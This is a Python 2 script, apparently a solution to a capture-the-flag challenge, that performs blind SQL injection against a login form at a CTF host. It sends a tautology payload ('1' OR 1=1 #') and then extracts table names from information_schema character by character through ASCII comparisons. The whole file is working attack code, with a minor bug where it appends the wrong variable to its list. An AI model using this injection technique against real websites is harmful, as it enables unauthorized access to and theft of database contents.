import urllib
import string
import urllib2
import json
import requests


url = "http://csie.ctf.tw:10110/admin.php"

def test(user):

    password = ""
    data = {
            "username"  :   user,
            "password"  :   password
    }
    r = requests.post(url, data=data)
    return r.text

if __name__ == '__main__':


    result_success = test("1' OR 1=1 #")
    table_names = []
    table_index = 0
    while True:
        char_index = 1
        s = ""
        while True:
            ascii_value = -1
            while True:
                user = "1' or ascii(substring( (select table_name from " + \
                       "information_schema.tables WHERE table_schema != 'mysql' " + \
                       "AND table_schema != 'information_schema' " + \
                       "LIMIT {},1), {}, 1))> {} #".format(
                            table_index, char_index, ascii_value
                       )
                print user
                result_string = test(user)
                if result_string != result_success:
                    break
                ascii_value += 1

            if ascii_value == 0:
                break
            s += chr(ascii_value)
            char_index += 1
        print s
        table_index += 1
        table_names.append(string)

